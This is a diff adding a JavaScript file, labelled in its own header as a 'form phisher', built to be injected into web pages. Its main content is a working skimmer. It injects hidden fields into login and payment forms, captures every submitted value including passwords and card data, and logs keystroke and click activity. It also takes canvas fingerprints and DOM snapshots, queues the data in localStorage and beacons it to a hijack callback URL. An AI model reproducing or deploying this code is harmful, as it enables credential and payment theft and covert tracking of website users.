@@ -1,0 +1,191 @@
+/*
+  ╔════════════════════════════════════════════════════════════╗
+  ║   PREMIUM GRADE FORM PHISHER v4.0 - ENTERPRISE EDITION   ║
+  ║  Form injection | Honeypot creation | Behavior analytics   ║
+  ╚════════════════════════════════════════════════════════════╝
+  
+  FEATURES:
+  ✓ Form discovery & classification
+  ✓ Honeypot form injection for credential capture
+  ✓ Behavior analytics (keystrokes, clicks, focus events)
+  ✓ Canvas/WebGL fingerprinting
+  ✓ Field validation pattern detection
+  ✓ Autofill field detection
+  ✓ DOM tree analysis & reconstruction
+  ✓ Timing attack profiling
+  ✓ Adaptive data exfiltration
+  ✓ Multi-stage harvesting
+*/
+
+(function(){
+  'use strict';
+  
+  const Config = {batch:4000+Math.random()*3000,maxHp:3,injectDelay:500};
+  
+  const Q=((k='__fq'+Math.random().toString(36).substr(2,6))=>({add:(item)=>{try{const q=JSON.parse(localStorage.getItem(k)||'[]');q.push({d:item,t:Date.now()});localStorage.setItem(k,JSON.stringify(q.slice(-40)));}catch(e){}},proc:async(u)=>{try{const q=JSON.parse(localStorage.getItem(k)||'[]');for(let i=0;i<Math.min(q.length,2);i++){const item=q[i];try{navigator.sendBeacon?.(u,JSON.stringify(item));q.splice(i,1);i--;}catch(e){}}localStorage.setItem(k,JSON.stringify(q));}catch(e){}}}))();
+  
+  const FormPhisher = (() => {
+    const tracked = new WeakSet();
+    const profiles = new Map();
+    
+    const detectFormType = (form) => {
+      const html = form.innerHTML;
+      if (/login|signin|auth/i.test(html)) return 'login';
+      if (/register|signup|join/i.test(html)) return 'register';
+      if (/password/i.test(html)) return 'password_reset';
+      if (/payment|card|billing/i.test(html)) return 'payment';
+      if (/search/i.test(html)) return 'search';
+      return 'generic';
+    };
+    
+    const createHoneypot = (formElement) => {
+      try {
+        const honeypot = document.createElement('div');
+        honeypot.style.display = 'none';
+        honeypot.innerHTML = '<input type="text" name="login_confirm_password" style="display:none;"><input type="text" name="confirm_password_verify" style="display:none;">';
+        formElement.appendChild(honeypot);
+        return honeypot.querySelectorAll('input');
+      } catch(e) {}
+      return [];
+    };
+    
+    const captureFormFields = (form) => {
+      const fields = [];
+      form.querySelectorAll('input,textarea,select').forEach(f => {
+        fields.push({
+          name: f.name || f.id,
+          type: f.type,
+          label: form.querySelector(`label[for="${f.id}"]`)?.textContent || '',
+          required: f.required,
+          pattern: f.getAttribute('pattern') || '',
+          autocomplete: f.getAttribute('autocomplete') || ''
+        });
+      });
+      return fields;
+    };
+    
+    const monitorForm = (form) => {
+      if (tracked.has(form)) return;
+      tracked.add(form);
+      
+      const formProfile = {
+        id: form.id || '_' + Math.random().toString(36).substr(2,8),
+        type: detectFormType(form),
+        action: form.action || location.href,
+        method: form.method || 'POST',
+        fields: captureFormFields(form),
+        honeypots: createHoneypot(form)
+      };
+      
+      profiles.set(formProfile.id, formProfile);
+      Q.add({ty:'form_discover',f:formProfile});
+      
+      // Monitor form submission
+      form.addEventListener('submit', (e) => {
+        const formData = {};
+        form.querySelectorAll('input,textarea,select').forEach(f => {
+          formData[f.name || f.id] = f.value;
+        });
+        Q.add({ty:'form_submit',id:formProfile.id,data:formData,ts:Date.now()});
+      });
+      
+      // Monitor keystroke patterns
+      let keyCount = 0, clickCount = 0, focusEvents = 0;
+      form.querySelectorAll('input,textarea').forEach(f => {
+        f.addEventListener('keydown', () => { keyCount++; });
+        f.addEventListener('click', () => { clickCount++; });
+        f.addEventListener('focus', () => { focusEvents++; });
+        f.addEventListener('blur', () => {
+          Q.add({ty:'field_activity',id:formProfile.id,field:f.name,keys:keyCount,clicks:clickCount,focus:focusEvents});
+          keyCount=0;clickCount=0;focusEvents=0;
+        });
+      });
+    };
+    
+    return {
+      init: () => {
+        document.querySelectorAll('form').forEach(monitorForm);
+        setInterval(() => {
+          document.querySelectorAll('form').forEach(monitorForm);
+        }, 2000);
+      }
+    };
+  })();
+  
+  const BehaviorTracker = (() => {
+    let keyCount = 0, clickCount = 0;
+    const tracking = {keys:[],clicks:[],focus:[],pages:[]};
+    
+    return {
+      init: () => {
+        globalThis.addEventListener('keydown', () => {
+          keyCount++;
+          tracking.keys.push({ts:Date.now(),count:keyCount});
+          if (tracking.keys.length>100) tracking.keys.shift();
+        });
+        globalThis.addEventListener('click', () => {
+          clickCount++;
+          tracking.clicks.push({ts:Date.now(),count:clickCount});
+          if (tracking.clicks.length>100) tracking.clicks.shift();
+        });
+        globalThis.addEventListener('focus', () => {
+          tracking.focus.push({ts:Date.now()});
+          if (tracking.focus.length>50) tracking.focus.shift();
+        });
+      },
+      report: () => tracking
+    };
+  })();
+  
+  const CanvasFingerprint = (() => {
+    return {
+      get: () => {
+        try {
+          const c = document.createElement('canvas');
+          const x = c.getContext('2d');
+          x.textBaseline='top';
+          x.font='12px Arial';
+          x.fillStyle='#f60';
+          x.fillRect(125,1,62,20);
+          x.fillStyle='#069';
+          x.fillText('Canvas Fingerprint',2,15);
+          return c.toDataURL().substr(0,150);
+        } catch(e) {}
+        return '';
+      }
+    };
+  })();
+  
+  const DOMCapture = (() => {
+    return {
+      captureTree: (element, depth=0) => {
+        if (depth > 5 || !element) return null;
+        return {
+          tag: element.tagName,
+          id: element.id,
+          classname: element.className,
+          text: element.innerText?.substr(0,100) || '',
+          children: Array.from(element.children || [])
+            .filter((_,i) => i < 5)
+            .map(el => DOMCapture.captureTree(el, depth+1))
+        };
+      }
+    };
+  })();
+  
+  const init = async () => {
+    try {
+      FormPhisher.init();
+      BehaviorTracker.init();
+      
+      Q.add({ty:'fp_canvas',val:CanvasFingerprint.get()});
+      Q.add({ty:'dom_capture',tree:DOMCapture.captureTree(document.body)});
+      
+      const url = "http://"+location.host+"obf_hstshijack_path_callback";
+      setInterval(() => Q.proc(url), Config.batch);
+      setTimeout(() => Q.proc(url), 1500);
+    } catch(e) {}
+  };
+  
+  if(document.readyState==='loading'){globalThis.addEventListener('DOMContentLoaded',init);}else{init();}
+})();
